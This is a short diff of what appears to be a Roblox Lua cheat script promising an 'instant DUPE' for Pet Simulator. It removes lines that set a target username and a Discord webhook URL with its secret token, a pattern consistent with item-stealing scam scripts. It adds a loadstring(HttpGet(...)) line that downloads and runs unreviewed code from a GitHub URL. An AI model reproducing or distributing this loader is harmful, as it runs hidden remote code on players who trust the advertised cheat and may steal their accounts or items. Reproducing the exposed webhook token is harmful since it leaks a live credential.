@@ -1,3 +1,1 @@
-_G.Username = "Dragonfly84658"
-_G.HubName  =  "instant DUPE!!"
-_WebhookUrl =  "https://discord.com/api/webhooks/1179273912601825311/PHXwAJ0FYzXLZkqkWcoly3lahGR9JZUBo-8XPeglx3-uuAYPwxpEuG7I1qZpZ3a6CR4e"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSim99Andx/PetSimulatorXDUPE/main/DUPE%20FOR%20PET%20SIM",true))()
